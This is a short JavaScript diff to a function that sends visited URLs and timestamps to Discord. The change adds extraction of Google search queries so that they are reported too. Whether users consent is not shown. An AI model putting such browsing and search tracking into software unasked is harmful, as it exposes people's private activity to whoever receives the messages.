@@ -5,14 +5,29 @@ function sendVisitToDiscord(url) {
   const timestampLocal = now.toLocaleString();       
   const timestampISO = now.toISOString();             
 
-  const hostname = new URL(url).hostname;  // Extract the website name
+  const parsedURL = new URL(url);
+  const hostname = parsedURL.hostname;
+  const pathname = parsedURL.pathname;
+  const searchParams = parsedURL.searchParams;
+
+  let title = `🌐 Visited ${hostname}`;
+  let description = `🕒 Visited at ${timestampLocal}`;
+
+  // Check for Google Search
+  if (hostname.includes("google.") && pathname === "/search") {
+    const query = searchParams.get("q");
+    if (query) {
+      title = `🔍 Searched "${query}" on ${hostname}`;
+      description += `\n🔗 Search: "${query}"`;
+    }
+  }
 
   const payload = {
     embeds: [
       {
-        title: `🌐 Visited ${hostname}`,           // <—— Changed line
+        title: title,
         url: url,
-        description: `🕒 Visited at ${timestampLocal}`,
+        description: description,
         color: 0x00AE86,
         timestamp: timestampISO
       }
